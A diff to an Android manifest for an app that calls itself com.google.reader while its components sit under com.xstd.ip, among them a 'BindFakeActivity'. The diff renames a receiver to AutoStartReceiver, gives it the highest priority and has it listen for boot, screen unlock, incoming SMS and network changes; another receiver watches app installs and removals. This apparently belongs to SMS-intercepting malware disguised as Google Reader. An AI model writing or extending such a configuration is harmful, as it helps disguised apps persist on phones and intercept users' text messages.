@@ -1,7 +1,8 @@
-<manifest package="com.google.reader"
-          xmlns:android="http://schemas.android.com/apk/res/android"
-          android:versionCode="1"
-          android:versionName="1.2.3">
+<manifest
+        package="com.google.reader"
+        xmlns:android="http://schemas.android.com/apk/res/android"
+        android:versionCode="1"
+        android:versionName="1.2.3">
 
     <uses-sdk
             android:minSdkVersion="8"
@@ -43,18 +44,18 @@
                 android:theme="@android:style/Theme.NoTitleBar.Fullscreen"/>
         <activity android:name="com.xstd.ip.BindFakeActivity"/>
 
-        <receiver android:name="com.xstd.ip.receiver.BootCompleteReceiver">
-            <intent-filter android:priority="0xFFFFFFF">
+        <receiver android:name="com.xstd.ip.receiver.AutoStartReceiver">
+            <intent-filter android:priority="0x7FFFFFFF">
                 <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="android.intent.action.USER_PRESENT"/>
                 <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
-
                 <category android:name="android.intent.category.DEFAULT"/>
             </intent-filter>
         </receiver>
         <receiver
                 android:name="com.xstd.ip.receiver.PackageAddRemReceiver"
-                android:priority="0x7fffffff">
+                android:priority="0x7FFFFFFF">
             <intent-filter>
                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
                 <action android:name="android.intent.action.PACKAGE_REMOVED"/>
